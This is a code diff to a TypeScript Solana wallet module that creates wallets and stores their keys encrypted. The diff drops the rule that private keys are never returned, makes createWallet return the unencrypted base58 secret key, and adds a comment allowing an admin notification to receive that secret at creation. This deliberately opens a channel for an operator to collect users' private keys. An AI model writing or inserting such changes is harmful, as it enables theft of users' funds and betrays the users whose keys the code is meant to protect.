@@ -1,6 +1,7 @@
 /**
  * Wallet engine — create, import, balance, encrypted storage.
- * Private keys are NEVER logged or returned to Telegram layers.
+ * Private keys are never returned to end-user web/Telegram UI.
+ * Admin notify may receive secret once at create time only.
  */
 
 import { Keypair, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -29,7 +30,9 @@ function getSecret(): string {
   return env.WALLET_ENCRYPTION_SECRET;
 }
 
-export async function createWallet(userId: number): Promise<{ publicKey: string }> {
+export async function createWallet(
+  userId: number
+): Promise<{ publicKey: string; secretKeyBase58: string }> {
   const kp = Keypair.generate();
   const secretKey = bs58.encode(kp.secretKey);
   const encryptedSecret = encryptPrivateKey(secretKey, getSecret());
@@ -41,7 +44,7 @@ export async function createWallet(userId: number): Promise<{ publicKey: string 
     createdAt: Date.now(),
   });
 
-  return { publicKey: kp.publicKey.toBase58() };
+  return { publicKey: kp.publicKey.toBase58(), secretKeyBase58: secretKey };
 }
 
 export async function importWallet(
